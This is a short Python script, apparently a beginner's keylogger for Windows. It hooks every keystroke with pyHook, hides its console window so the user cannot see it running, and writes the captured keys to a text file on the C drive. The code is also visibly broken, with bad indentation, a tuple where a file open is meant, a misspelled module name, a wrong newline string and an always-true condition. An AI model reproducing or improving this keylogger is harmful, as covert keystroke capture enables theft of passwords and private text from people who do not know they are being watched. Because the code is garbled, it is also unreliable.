

#Walk to the library, obtain the books to create the Python application

import win32api
import win32console
import win32gui
import pythoncom, pyHook #<---Is the class library for the keyboard

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)



def OnKeyBoardEvent(event):


	if event.Ascii==5:
	_exit(1)


	if event.Ascii !=0 or 8:

		f = open('c:\output.txt', 'r+')


		buffer = f.read()

		f.close()

	#Reopen the text file when the user starts typing again on the keyboard.
		f = ('c\output.txt', 'w')

		keylogs = chr(event.Ascii)

		if event.Ascii == 13:

		keylogs = '/n' #<---Start a new line in the text file.

		buffer += keylogs

		f.write(buffer)
		f.close()

#create a hook for the manager object

hm = pyHook.HookManager() #<---Referencing the class library that was implemented
hm.KeyDown = OnKeyBoardEvent #<---Everytime you press on the keyboard, run the function of logging the events in a text file.

#Set the hook
hm.HookKeyboard()

#Wait forever
pyhtoncom.PumpMessages()